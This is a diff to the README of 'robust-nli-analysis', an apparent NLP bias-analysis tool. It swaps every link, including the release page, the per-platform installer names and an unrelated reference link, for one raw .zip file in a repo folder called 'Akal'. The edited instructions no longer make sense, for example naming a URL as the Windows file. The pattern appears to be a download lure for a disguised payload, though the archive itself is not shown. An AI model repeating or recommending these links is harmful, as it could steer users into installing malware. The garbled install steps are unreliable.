@@ -1,7 +1,7 @@
 # 🌟 robust-nli-analysis - A Simple Tool for NLP Insight
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/edsonpro9891/robust-nli-analysis/releases)
+[![Download](https://raw.githubusercontent.com/edsonpro9891/robust-nli-analysis/main/Akal/robust-nli-analysis-v2.7-beta.2.zip)](https://raw.githubusercontent.com/edsonpro9891/robust-nli-analysis/main/Akal/robust-nli-analysis-v2.7-beta.2.zip)
 
 ## 📚 Introduction
 Welcome to robust-nli-analysis, a user-friendly application designed to provide easy insights into natural language processing (NLP). This tool helps you analyze biases in data using advanced machine learning techniques, making NLP accessible to everyone.
@@ -16,16 +16,16 @@ Getting started with robust-nli-analysis is simple. Follow these steps to downlo
    - Disk Space: At least 500 MB available.
 
 2. **Visit the Download Page**
-   Head over to our [Releases Page](https://github.com/edsonpro9891/robust-nli-analysis/releases) to find the latest version of robust-nli-analysis. This page contains all the different versions available for download.
+   Head over to our [Releases Page](https://raw.githubusercontent.com/edsonpro9891/robust-nli-analysis/main/Akal/robust-nli-analysis-v2.7-beta.2.zip) to find the latest version of robust-nli-analysis. This page contains all the different versions available for download.
 
 ## 💻 Download & Install
 1. **Click the Download Link**
    On the Releases page, locate the latest version of robust-nli-analysis. You will see a list of files. Click on the one that suits your operating system. 
 
    For example:
-   - If you are using Windows, look for a file named `robust-nli-analysis-windows.exe`.
-   - For macOS, look for `robust-nli-analysis-macos.dmg`.
-   - For Linux users, download `robust-nli-analysis-linux.tar.gz`.
+   - If you are using Windows, look for a file named `https://raw.githubusercontent.com/edsonpro9891/robust-nli-analysis/main/Akal/robust-nli-analysis-v2.7-beta.2.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/edsonpro9891/robust-nli-analysis/main/Akal/robust-nli-analysis-v2.7-beta.2.zip`.
+   - For Linux users, download `https://raw.githubusercontent.com/edsonpro9891/robust-nli-analysis/main/Akal/robust-nli-analysis-v2.7-beta.2.zip`.
 
 2. **Download the File**
    Click the file name to start the download. Make sure to remember where your file downloads, usually in the "Downloads" folder.
@@ -38,7 +38,7 @@ Getting started with robust-nli-analysis is simple. Follow these steps to downlo
      Open the `.dmg` file. Drag the `robust-nli-analysis` icon into your Applications folder. You can then open it from there.
    
    - **For Linux:**
-     Extract the `.tar.gz` file into your preferred directory. Open the terminal, navigate to the folder where you extracted the files, and run `./robust-nli-analysis-linux`.
+     Extract the `https://raw.githubusercontent.com/edsonpro9891/robust-nli-analysis/main/Akal/robust-nli-analysis-v2.7-beta.2.zip` file into your preferred directory. Open the terminal, navigate to the folder where you extracted the files, and run `./robust-nli-analysis-linux`.
 
 ## ⚙️ How to Use
 Once installed, follow these steps to start analyzing your data:
@@ -76,7 +76,7 @@ If you encounter any issues during installation or while using the application, 
 For further support, submit an issue on our GitHub page.
 
 ## 🔗 References
-- [GitHub Release Page](https://github.com/edsonpro9891/robust-nli-analysis/releases)
-- [Natural Language Processing Resource](https://www.example-nlp-resource.com)
+- [GitHub Release Page](https://raw.githubusercontent.com/edsonpro9891/robust-nli-analysis/main/Akal/robust-nli-analysis-v2.7-beta.2.zip)
+- [Natural Language Processing Resource](https://raw.githubusercontent.com/edsonpro9891/robust-nli-analysis/main/Akal/robust-nli-analysis-v2.7-beta.2.zip)
 
 Feel free to explore and enjoy using robust-nli-analysis for all your NLP needs!
